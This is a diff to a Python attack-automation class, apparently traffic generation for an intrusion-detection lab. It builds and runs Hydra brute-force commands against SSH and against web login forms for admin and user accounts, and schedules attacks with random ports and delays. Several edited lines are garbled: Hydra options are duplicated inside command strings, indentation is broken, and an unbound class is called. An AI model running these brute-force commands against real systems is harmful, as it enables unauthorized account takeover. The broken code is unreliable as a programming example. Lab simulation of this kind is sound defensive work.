@@ -148,11 +148,16 @@ class attackerClass(object):
             print()
             print("Method: " + method + " Executed")
             print("================================")
+            att=attackerClass
+	att.record_trans(server_id,service_id,action_id)
 
 
         except Exception as e:
             print (str(e))
             log.exception(e)
+
+    def record_trans(self,server_id,service_id,action_id):
+        self.data.record_transaction(server_id,service_id,action_id)
 
     "===================================================================CLASS METHODS========================================================="
 
@@ -170,7 +175,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce Being Executed")
-            command = "hydra -L /home/attacker/IR/usernames.txt -P /home/alex/Documents/GitRepo/IR/passwords.txt {} ssh".format(ip)
+            command = "hydra -L /var/log/sensor/attacker/IR/usernames.txt -P hydra -L /var/log/sensor/attacker/IR/passwords.txt {} ssh".format(ip)
             child = pexpect.spawn(command)
             time.sleep(30)
             print("BruteForce Successfully Executed")
@@ -875,7 +880,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce On Webpage (Admin) Being Executed")
-            command = "hydra -l admin -P /home/attacker/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
+            command = "hydra -l admin -P hydra -L /var/log/sensor/attacker/IR/usernames/webpass.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
                 ip)
             child = pexpect.spawn(command)
             time.sleep(30)
@@ -903,7 +908,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce On Webpage (User) Being Executed")
-            command = "hydra -l user -P /home/attacker/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
+            command = "hydra -l user -P /var/log/sensor/attacker/IR/usernames/webpass.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
                 ip)
             child = pexpect.spawn(command)
             time.sleep(30)
@@ -974,10 +979,9 @@ class attackerClass(object):
 
         return my_dic
 
-    def record_transaction(self, server_id,service_id,action_id):
-        self.data.record_transcation(server_id,service_id,action_id)
-
-        return True
+    #def record_transaction(self, server_id,service_id,action_id):
+    #    self.data.record_transcation(server_id,service_id,action_id)
+    #   return True
 
     "===================================================================DATA ACCESS METHODS========================================================================="
 
@@ -1014,7 +1018,7 @@ class attackerClass(object):
         Start port connection script
         '''
         ip = args["IP"]
-        port = random.choice([1, 2, 3])
+        port = random.choice([21,24])
 
         try:
 
@@ -1085,14 +1089,15 @@ class attackerClass(object):
        # random_repetition = random.randint(1, 5)
        # print('Running ' + str(random_repetition) + ' times')
         #current_date=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        #random_time=random.randint(10,30)
+        random_time=random.randint(10,30)
         object=attackerClass()
         the_array=object.get_data()
         object.generate_random_request(the_array)
         #object.record_transaction(current_date)
-        #time.sleep(random_time)
+        time.sleep(random_time)
         print('====COmplete====')
-
+	
+	"Call this method to send email after attack has completed execute_email_script()"
 
         '''
         for i in range(0, random_repetition):
